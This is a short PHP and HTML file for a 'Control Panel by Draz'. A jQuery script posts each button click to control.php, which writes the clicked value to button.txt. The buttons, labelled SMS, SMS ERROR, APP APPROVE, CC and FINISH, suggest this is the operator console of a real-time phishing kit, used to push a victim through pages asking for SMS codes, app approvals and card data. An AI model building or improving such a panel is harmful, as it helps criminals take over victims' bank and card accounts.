<?php
if (isset($_POST['button'])) {
    $button = $_POST['button'];
    file_put_contents('button.txt', $button); // Store the clicked button value in a file
    exit;
}
?>
<!-- Rest of the HTML code remains the same -->

<!-- Rest of the HTML code remains the same -->



<!DOCTYPE html>
<html>
<head>
    <title>Control Panel by Draz</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f2f2f2;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start; /* Align to the top of the page */
            height: 100vh;
            background-image: url('https://wallpaperaccess.com/full/854824.jpg');
            background-position: center;
            background-size: cover;
        }

        h1 {
            text-transform: uppercase;
            font-size: 32px;
            color: #fff;
            text-align: center;
            margin-bottom: 20px;
        }

        .button-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-top: 20px;
        }

        .button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #4CAF50;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin: 10px;
            transition: background-color 0.3s ease;
        }

        .button:hover {
            background-color: #45a049;
        }

        @media (max-width: 767px) {
            h1 {
                font-size: 24px;
            }

            .button {
                padding: 8px 16px;
                font-size: 14px;
                margin: 5px;
            }
        }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        $(document).ready(function () {
            $('.button').click(function () {
                var button = $(this).attr('id');
                $.ajax({
                    url: 'control.php',
                    type: 'POST',
                    data: {button: button},
                    success: function () {
                        console.log('Button ' + button + ' is clicked.');
                        
                    }
                });
            });
        });
    </script>
</head>
<body>
    <div class="container">
        <h1>Control Panel by Draz</h1>
        <div class="button-container">
            <button class="button" id="button1">SMS</button>
             <button class="button" id="button2">SMS ERROR</button>
            <button class="button" id="button3">APP APPROVE</button>
            <button class="button" id="button4">CC</button>
            <button class="button" id="button5">FINISH</button>
        </div>
    </div>
</body>
</html>
